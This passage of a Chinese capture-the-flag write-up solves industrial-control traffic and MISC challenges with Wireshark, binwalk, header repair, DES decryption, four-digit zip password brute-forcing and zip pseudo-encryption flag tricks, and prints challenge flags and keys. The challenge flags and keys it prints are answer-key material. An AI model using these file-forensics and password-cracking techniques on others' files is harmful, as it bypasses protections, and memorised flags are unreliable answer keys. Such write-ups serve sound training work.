src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651134467336-aedb172f-3cf6-4963-8e9d-a4b499329b95.png#clientId=u504ec107-5856-4&amp;from=paste&amp;height=113&amp;id=u25e02074&amp;originHeight=149&amp;originWidth=918&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=30872&amp;status=done&amp;style=none&amp;taskId=ue988f514-5188-4218-b3ad-304dde0e19c&amp;title=&amp;width=695.4000244140625" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651134424768-cfd55849-1690-4aa4-9b4d-d23ecb432510.png#clientId=u504ec107-5856-4&amp;from=paste&amp;height=62&amp;id=ue821d670&amp;originHeight=145&amp;originWidth=1439&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=27801&amp;status=done&amp;style=none&amp;taskId=u3f796e7e-1c96-4f28-ac4c-224102fdb17&amp;title=&amp;width=615" alt="image.png"><br />LED 闪了三次，管理员大大也提示了，查看数据包<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651134718964-00f93a82-a992-4b60-8043-55cb17b4f960.png#clientId=u504ec107-5856-4&amp;from=paste&amp;height=199&amp;id=u68e1b416&amp;originHeight=587&amp;originWidth=1698&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=86166&amp;status=done&amp;style=none&amp;taskId=u45e73172-4a93-4914-aad3-48cd91391da&amp;title=&amp;width=576" alt="image.png"><br /><strong>密文是：U2FsdGVkX19cOOV8qLVgcso8U4fse+7LirQKiHFkn9HU9BuwFAivH1siJXg/Rk6z</strong><br />为 aes/des 加密<br /><strong>密钥是：585692787</strong><br />解码即可<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651134817663-1c67e348-2aaa-4e7c-bf3d-dd5b1cf3924a.png#clientId=u504ec107-5856-4&amp;from=paste&amp;height=150&amp;id=ua1c7980a&amp;originHeight=409&amp;originWidth=1727&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=38315&amp;status=done&amp;style=none&amp;taskId=uf07d44ac-1d71-45f9-9b65-3764be80fed&amp;title=&amp;width=634" alt="image.png"><br><a name="osWHY"></a></p><h3 id="3-需要安全感"><a href="#3-需要安全感" class="headerlink" title="3.需要安全感"></a>3.需要安全感</h3><p><a name="CF3RI"></a></p><h3 id="4-carefulguy"><a href="#4-carefulguy" class="headerlink" title="4.carefulguy"></a>4.carefulguy</h3><p>还是流量分析，wireshark打开，这个脑洞确实，还是自己太菜了。。。查找flag 然后没有什么信息，之后追踪 TCP 流。。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650879450023-80cca37b-e709-4c7e-96b1-8205b9d3565f.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=311&amp;id=u5f7f5ef6&amp;originHeight=853&amp;originWidth=1314&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=123062&amp;status=done&amp;style=none&amp;taskId=uc2f23e25-6393-444b-ad42-06023da9be9&amp;title=&amp;width=478.60003662109375" alt="image.png"><br />只好往上看看，是否有信息<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650879567875-bb335ca8-89b6-4742-895b-8203eb521087.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=340&amp;id=u913878e1&amp;originHeight=817&amp;originWidth=1095&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=51051&amp;status=done&amp;style=none&amp;taskId=u089b6668-6a80-400c-aa49-fc007d9983a&amp;title=&amp;width=455.6000061035156" alt="image.png"><br />直到第3个才发现有16进制信息，而且有规律，都拿出来看看<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650879655810-1a299300-487a-4425-8c70-c4beb07ca6c8.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=357&amp;id=u4d8b9c78&amp;originHeight=783&amp;originWidth=994&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=53116&amp;status=done&amp;style=none&amp;taskId=u9da7c345-be2f-493a-aa6d-d15ea7f6e13&amp;title=&amp;width=453.6000061035156" alt="image.png"><br />到第 22 个以为结束了，发现还有…我丢！！！累死了。继续<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650879911861-d534a98b-e391-4e9b-9372-cf8c667e8f02.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=227&amp;id=u84d96b31&amp;originHeight=604&amp;originWidth=1332&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=42927&amp;status=done&amp;style=none&amp;taskId=u0ecb9cda-fba6-4c0e-aa0f-c88026bc4bd&amp;title=&amp;width=501.60003662109375" alt="image.png"><br />呵呵….我谢谢他哈~<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650880037155-be959967-091c-457c-8b5a-cb6c3d97a06f.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=399&amp;id=ub8553a57&amp;originHeight=864&amp;originWidth=851&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=23094&amp;status=done&amp;style=none&amp;taskId=uc66df646-82f1-4627-b77e-365f22053d2&amp;title=&amp;width=392.8000183105469" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650880098769-7ea2ccf5-d1c6-4eb8-80f2-70aaabaa8403.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=249&amp;id=u0caad8db&amp;originHeight=524&amp;originWidth=1067&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=26086&amp;status=done&amp;style=none&amp;taskId=u296c37e7-6dad-440d-9f22-814f7d7eaf7&amp;title=&amp;width=507.60003662109375" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666c61677b7034757333313576337279316e7433726573746963397d</span><br></pre></td></tr></table></figure><p><a name="t7moP"></a></p><h3 id="5-喜欢移动的黑客"><a href="#5-喜欢移动的黑客" class="headerlink" title="5.喜欢移动的黑客"></a>5.喜欢移动的黑客</h3><p>这里补一张常见 16进制 文件头 和 文件尾<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650883282509-5c5e0a76-f7d8-472f-b1f1-000b481f7983.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=423&amp;id=ua2d80dd3&amp;originHeight=726&amp;originWidth=659&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=217385&amp;status=done&amp;style=none&amp;taskId=ucdf4a04a-ed84-4385-9357-f2c3e3afd57&amp;title=&amp;width=384.20001220703125" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650901758310-2c5400e8-1b02-4998-b373-1223b2127721.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=186&amp;id=QnpcE&amp;originHeight=438&amp;originWidth=1085&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=18803&amp;status=done&amp;style=none&amp;taskId=uad68a8a5-f513-4865-ba03-f1ef5b9b704&amp;title=&amp;width=460" alt="image.png"><br /><strong>这是文件 hint </strong><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650883391769-eecc3b9a-b8a2-41ee-a9b2-f599e3a33310.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=113&amp;id=u441c53c5&amp;originHeight=235&amp;originWidth=1199&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=28724&amp;status=done&amp;style=none&amp;taskId=uafe9f358-a57b-4d82-8c9b-c843a173091&amp;title=&amp;width=576.6000366210938" alt="image.png"><br />打不开啊~~~，file 看看是不是 pcapng 文件<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650883198494-ffab40f5-fc1f-41b7-b30c-37e74c7f13c2.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=65&amp;id=ufc433c52&amp;originHeight=94&amp;originWidth=566&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=17454&amp;status=done&amp;style=none&amp;taskId=uffec75e3-902e-4165-9bbb-73b602e2daf&amp;title=&amp;width=389.8000183105469" alt="image.png"><br />010editor 打开看看是不是缺少文件头<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650880306150-cf471233-f5a0-4efd-9618-1464f6dc2e32.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=212&amp;id=u47e1d647&amp;originHeight=633&amp;originWidth=1460&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=64745&amp;status=done&amp;style=none&amp;taskId=u275f1f2d-e8f3-4e2f-89c0-5d1ffc93072&amp;title=&amp;width=489.60003662109375" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650881163624-2adf0982-248d-476e-a356-e4b9bef159e3.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=62&amp;id=u55874296&amp;originHeight=122&amp;originWidth=979&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=15458&amp;status=done&amp;style=none&amp;taskId=u4e0eb086-09fd-45bb-bdde-9ec73fb4bbb&amp;title=&amp;width=493.60003662109375" alt="image.png"><br />emm，开补  <strong>0A 0D 0D 0A </strong><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650881147409-db31d0ae-ad14-485a-83e3-1952453fdbce.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=74&amp;id=ua2d42c07&amp;originHeight=135&amp;originWidth=920&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=17845&amp;status=done&amp;style=none&amp;taskId=uc3c5a9f4-6d70-4ddd-95c8-82031f2bf3d&amp;title=&amp;width=504.60003662109375" alt="image.png"><br />首先 筛选 <strong>modbus</strong> 因为是工控协议嘛，查看数据大于1000<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650883593394-6be98bd6-f452-485e-9118-1eecebf27b55.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=292&amp;id=u4e2284ed&amp;originHeight=762&amp;originWidth=1304&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=88551&amp;status=done&amp;style=none&amp;taskId=u448943aa-3658-4aed-a3d6-4fcdc2dde12&amp;title=&amp;width=499.60003662109375" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650882772724-09fc0572-5c28-4b25-a71d-0917672c3d0f.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=248&amp;id=u93ae9fa8&amp;originHeight=521&amp;originWidth=786&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=68310&amp;status=done&amp;style=none&amp;taskId=u39a98f1a-6fce-4f37-a320-ddc7149ecc5&amp;title=&amp;width=373.8000183105469" alt="image.png"><br />后来发现还有一个数据包也可以  <strong>270f </strong>的10进制为 9999<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650886092021-5a34e20b-78a3-41ba-bfe5-699ffe5ac368.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=134&amp;id=ueb2f042c&amp;originHeight=303&amp;originWidth=1205&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=26655&amp;status=done&amp;style=none&amp;taskId=ud77962e4-f02c-45c2-b1ad-ba0cc01865b&amp;title=&amp;width=532.6000366210938" alt="image.png"></p><ol><li>flag{<strong>2766</strong>68156} 这里 2766 需要转换 hex —&gt;flag{<strong>10086</strong>68156}<br><a name="Tugb6"></a></li></ol><h3 id="6-easyiec"><a href="#6-easyiec" class="headerlink" title="6.easyiec"></a>6.easyiec</h3><p>名副其实的签到题，wireshark 追踪 tcp 流 find 一下<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650878173510-634553de-ec84-45de-9acc-277414ac25bc.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=381&amp;id=u6710369d&amp;originHeight=826&amp;originWidth=1075&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=84218&amp;status=done&amp;style=none&amp;taskId=u3cd34746-ae9f-43cc-b273-23469cd5717&amp;title=&amp;width=495.60003662109375" alt="image.png"><br><a name="mVChA"></a></p><h3 id="7-cryptolalia"><a href="#7-cryptolalia" class="headerlink" title="7.cryptolalia"></a>7.cryptolalia</h3><p>解压完毕发现只有一张图片，还这么大… 还有一条 🐟（此🐟很重要！！！）<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650891199211-9ce67606-78c5-4c36-a159-b9ab50901666.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=182&amp;id=u45809d96&amp;originHeight=427&amp;originWidth=1068&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=16794&amp;status=done&amp;style=none&amp;taskId=u804828f0-f486-4e91-9287-328d489bf00&amp;title=&amp;width=455.6000061035156" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650891160619-c71c7c9a-e1b8-4fb3-b60b-459ced6049d8.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=190&amp;id=u7882a4af&amp;originHeight=385&amp;originWidth=638&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=54357&amp;status=done&amp;style=none&amp;taskId=u550f704b-e4f3-4ffe-a926-89e35b3a8af&amp;title=&amp;width=315.3999938964844" alt="image.png"><br />binwalk 分离一下，发现 zip <br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650891366900-d3854fb9-ccb9-4eb4-9a05-a066c8ef4b95.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=131&amp;id=ua2a00423&amp;originHeight=348&amp;originWidth=1325&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=107204&amp;status=done&amp;style=none&amp;taskId=u6f6288ba-b401-443e-b2ea-a48bd0b035d&amp;title=&amp;width=500.60003662109375" alt="image.png"><br />提取出来瞅瞅…   头一次参加工控类的 CTF 感觉也很不错啊，都是贴近工厂，哈哈哈<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650891429211-b752cb1b-9e47-4e5d-b185-0519dcfe4d67.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=91&amp;id=u3e36b7ec&amp;originHeight=218&amp;originWidth=1179&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=70309&amp;status=done&amp;style=none&amp;taskId=u8231e677-da77-4803-82ab-757de0aa8ea&amp;title=&amp;width=493.6000061035156" alt="image.png"><br />给的提示很明显了，先 <strong>污泥脱水间数据详情 </strong>后 <strong>设备药剂间数据详情</strong><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650891518833-185c585f-11d9-403b-827c-308d05e339c8.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=69&amp;id=u08774f52&amp;originHeight=142&amp;originWidth=990&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=21070&amp;status=done&amp;style=none&amp;taskId=u8e1d6e1e-2cd7-45d2-a11b-fd9591bde2a&amp;title=&amp;width=481.60003662109375" alt="image.png"><br />fuzz 爆破一下四位数，他就来了~<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650890269177-04f6935a-824e-4233-9766-ca5b31a280bf.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=157&amp;id=u0d44f39e&amp;originHeight=535&amp;originWidth=1593&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=180889&amp;status=done&amp;style=none&amp;taskId=u6a596d30-947f-4d61-baa9-649bfdb7225&amp;title=&amp;width=468.6000061035156" alt="image.png"><br />解压之后还是 wireshark <br />发现 des 密文<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650890965265-e3d5a872-2e79-4606-be5a-63bb58b02426.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=251&amp;id=u897be425&amp;originHeight=813&amp;originWidth=1725&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=157349&amp;status=done&amp;style=none&amp;taskId=ue2a2128b-f335-47ef-b621-77e7a39bc0e&amp;title=&amp;width=531.6000366210938" alt="image.png"><br /><strong>U2FsdGVkX19  </strong>我发现绝大部分 des 加密都是以这个开头的 ~~~<br />接下来继续根据提示 🐟 解密，使用的是 <strong>TripleDes</strong>  <a href="https://www.sojson.com/encrypt_triple_des.html">https://www.sojson.com/encrypt_triple_des.html</a><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650890881337-16848eef-6d29-4fad-97c5-5813fa21e11b.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=140&amp;id=u56dcb464&amp;originHeight=325&amp;originWidth=1278&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=34599&amp;status=done&amp;style=none&amp;taskId=ub223670c-7975-4fb4-ae73-b3bebbc213d&amp;title=&amp;width=548.6000366210938" alt="image.png"><br />发现开始打不开，但是还没有解压密码，根据提示 <strong>眼见不一定为实</strong> 010editor 发现<strong>伪加密</strong><br><a name="lUp6b"></a></p><h4 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h4><p>主要是查看压缩包的文件头标志位</p><ol><li>压缩文件数据区（全局加密）</li></ol><p>504B0304      这个是压缩包的文件头  它的后3、4个字节（byte）</p><ol><li>压缩文件目录区（全局加密）</li></ol><p>504B0102      这个是压缩包文件目录区  它的后5、6个字节（byte）</p><pre><code>  1. 无加密</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">● 压缩文件数据区 ：00 00 </span><br><span class="line">● 压缩文件目录区 ：00 00 </span><br></pre></td></tr></table></figure><pre><code>  2. 假加密</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">● 压缩文件数据区 ：00 00 </span><br><span class="line">● 压缩文件目录区 ：09 00 </span><br></pre></td></tr></table></figure><pre><code>  3. 真加密</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">● 压缩文件数据区 ：09 00 </span><br><span class="line">● 压缩文件目录区 ：09 00 </span><br></pre></td></tr></table></figure><p>之后我们再看这个题目，<strong>压缩文件数据区为 00 00 但是压缩文件目录区为 09 00 </strong>所以为 <strong>伪加密</strong><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650893285962-18f029a3-ea09-4d4a-b93e-5fb7b475d952.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=255&amp;id=u58060062&amp;originHeight=523&amp;originWidth=849&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=107349&amp;status=done&amp;style=none&amp;taskId=u9d92f109-361a-4550-8f55-73cae371f95&amp;title=&amp;width=414.20001220703125" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650894250895-3db597c1-72eb-4e96-9da1-6e19a7fedf07.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=238&amp;id=u0dd8eebd&amp;originHeight=484&amp;originWidth=857&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=79381&amp;status=done&amp;style=none&amp;taskId=u2ff293d1-90c5-4d6c-8ed1-1b90bd758c2&amp;title=&amp;width=420.6000061035156" alt="image.png"><br />此时我们修改 <strong>压缩文件目录区标志位</strong> 为 <strong>00 00 </strong>即可<br />wireshark 打开，发现 <strong>IHDR </strong>隐藏图片，复制 Data，粘贴出来（这里一定到看常用的文件尾部的16进制，否则会有数据缺失。。。）<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650935422334-98a665bf-a646-464d-928b-e5fa5c2092a9.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=269&amp;id=u557be84c&amp;originHeight=824&amp;originWidth=1733&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=156745&amp;status=done&amp;style=none&amp;taskId=u39cc46dd-845a-4bf4-93bd-45fd9b7441e&amp;title=&amp;width=565.7999877929688" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650935539905-80124d4d-f0d1-4399-a7a5-e510f45befca.png#clientId=ua2c0bf12-96ea-4&amp;from=paste&amp;height=276&amp;id=uca4190e2&amp;originHeight=788&amp;originWidth=1284&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=136796&amp;status=done&amp;style=none&amp;taskId=u5f4dff6b-0226-452d-acf4-871e5b7ac4f&amp;title=&amp;width=449.79998779296875" alt="image.png"><br />这里再来一张，因为涉及到 jpg 格式的文件尾部。。。差点害惨我，呜呜~~~<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650901758310-2c5400e8-1b02-4998-b373-1223b2127721.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=150&amp;id=b5j6j&amp;originHeight=438&amp;originWidth=1085&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=18803&amp;status=done&amp;style=none&amp;taskId=uad68a8a5-f513-4865-ba03-f1ef5b9b704&amp;title=&amp;width=372" alt="image.png"><br />010 editor 粘贴进去，下面给出详细步骤，因为很坑….<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650902079133-cf410a58-1470-47de-af0c-fe72987f7957.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=189&amp;id=uf5d33018&amp;originHeight=569&amp;originWidth=963&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=67240&amp;status=done&amp;style=none&amp;taskId=u9260cad8-5127-46a4-bdf4-2502e7fd292&amp;title=&amp;width=319.20001220703125" alt="image.png"><br />保存 flag.png 调整宽高<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650901965821-398141d0-ba9e-4b39-adfa-27820f833492.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=138&amp;id=u66e0bb3c&amp;originHeight=484&amp;originWidth=1633&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=128147&amp;status=done&amp;style=none&amp;taskId=u0a20139d-d78c-4478-8aa0-9c264ce5fcc&amp;title=&amp;width=464" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650902310597-0d6c779e-a9cd-40b4-924c-71ef56cc4f1e.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=249&amp;id=u575a5ddc&amp;originHeight=592&amp;originWidth=1140&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=147603&amp;status=done&amp;style=none&amp;taskId=u9c08cd51-c842-49e5-9625-b1f46a8856d&amp;title=&amp;width=480.20001220703125" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650902393077-9d85f5c2-9a21-40df-8bef-cd06bd31d272.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=161&amp;id=SMt6c&amp;originHeight=460&amp;originWidth=1719&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=163230&amp;status=done&amp;style=none&amp;taskId=u3b021a30-62c8-436b-ba2f-a9a014a3c7e&amp;title=&amp;width=600.2000122070312" alt="image.png"><br /><strong>这里还有另外一种从 wireshark 中导出数据的方式，就是利用 tshark</strong><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650900509413-b05de98d-286f-4946-980c-e94f4036bf62.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=75&amp;id=u9ab8583f&amp;originHeight=155&amp;originWidth=1202&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=23108&amp;status=done&amp;style=none&amp;taskId=u0d838b60-8927-4b98-8402-1d6476a8ce6&amp;title=&amp;width=578.7999877929688" alt="image.png"><br><a name="WGge8"></a></p><h3 id="8-xyp07"><a href="#8-xyp07" class="headerlink" title="8.xyp07"></a>8.xyp07</h3><p>打开发现压缩包加密了。。。010 editor 打开<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650878514202-2ec6a62e-2248-4faa-a3e5-a6d4ff230452.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=207&amp;id=uea87bcaf&amp;originHeight=584&amp;originWidth=1317&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=75905&amp;status=done&amp;style=none&amp;taskId=u5545d3c8-e9e2-45cf-8c1e-3821138fc08&amp;title=&amp;width=466.60003662109375" alt="image.png"><br />发现文件最后有密文，base64…<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650878587356-05ea718e-45d1-49c3-a60b-34256e7e820f.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=336&amp;id=ub3778928&amp;originHeight=726&amp;originWidth=970&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=115982&amp;status=done&amp;style=none&amp;taskId=uadd7f3a3-f1f7-4c0a-9a4e-5b2c68f8dde&amp;title=&amp;width=448.6000061035156" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vm0weGQxRXlTWGxVV0d4V1YwZFNVRlpyV25kWlZsSllZMFZrVmxKdVFsaFdNalZMWWtkS1IxTnFSbGhYU0VKNlZsWmFWMVpWTVVWaGVqQTk=</span><br></pre></td></tr></table></figure><p>base 64 decode，也就解了 7~8 次吧。。。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650878702669-7947b50d-7166-476e-ade1-c9b7fdddcffa.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=214&amp;id=u5c27997c&amp;originHeight=576&amp;originWidth=1544&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=51319&amp;status=done&amp;style=none&amp;taskId=ueffdbb53-2271-44e8-9d67-d1d7fdab66e&amp;title=&amp;width=574.6000366210938" alt="image.png"><br />wireshark 分析了半天，TCP追踪流也看了眼睛也花了，之后过滤掉。。。<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650878875410-40852dbf-dd1d-4a7e-aeae-6c2920aac6fc.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=323&amp;id=u12e40157&amp;originHeight=865&amp;originWidth=1312&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=178524&amp;status=done&amp;style=none&amp;taskId=uc236d3ef-3c3a-467d-b861-27584bebd25&amp;title=&amp;width=489.60003662109375" alt="image.png"><br />开始追踪 协议为 S7COMM 的TCP流，发现异常的数据信息，base91..<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650878947303-206a1800-6c3a-4431-b25b-79a2458e885c.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=241&amp;id=udf4dd90e&amp;originHeight=688&amp;originWidth=1752&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=105963&amp;status=done&amp;style=none&amp;taskId=u2d994512-6283-4a3d-8c5c-9f7923c0275&amp;title=&amp;width=614.6000366210938" alt="image.png"><br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1650879060901-335efa88-dfb8-4c30-a638-cae9b5230c10.png#clientId=u49706721-f1a6-4&amp;from=paste&amp;height=416&amp;id=u596f8971&amp;originHeight=966&amp;originWidth=777&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=90702&amp;status=done&amp;style=none&amp;taskId=u15aa1876-8f00-42b6-b930-5e678cd2c7f&amp;title=&amp;width=334.6000061035156" alt="image.png"><br><a name="rBMa3"></a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><p><a name="KQoUb"></a></p><h3 id="1-FindMe"><a href="#1-FindMe" class="headerlink" title="1.FindMe"></a>1.FindMe</h3><p>给了提示，让去 GitHub 搜一下…<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651305847933-2642c5c8-daac-40c3-b5be-bf45a31f1192.png#clientId=u0fba9173-bf4b-4&amp;from=paste&amp;height=209&amp;id=ubb21cf85&amp;originHeight=492&amp;originWidth=994&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=57024&amp;status=done&amp;style=none&amp;taskId=uc293cbfa-4c82-480b-a01e-4966401b4ae&amp;title=&amp;width=421.6000061035156" alt="image.png"><br />下载下来，结果火绒报毒了…<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/1425637/1651305883948-7a45f739-2826-488f-8f74-6d653fce7cbd.png#clientId=u0fba9173-bf4b-4&amp;from=paste&amp;height=205&amp;id=uc52df51d&amp;originHeight=453&amp;originWidth=812&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=52861&amp;status=done&amp;style=none&amp;taskId=u35eee23f-f415-4db1-ae0d-c224fe279d2&amp;title=&amp;width=367.6000061035156" alt="image.png"><br />看到网上大佬说放入 VT 扫一下<br /><img 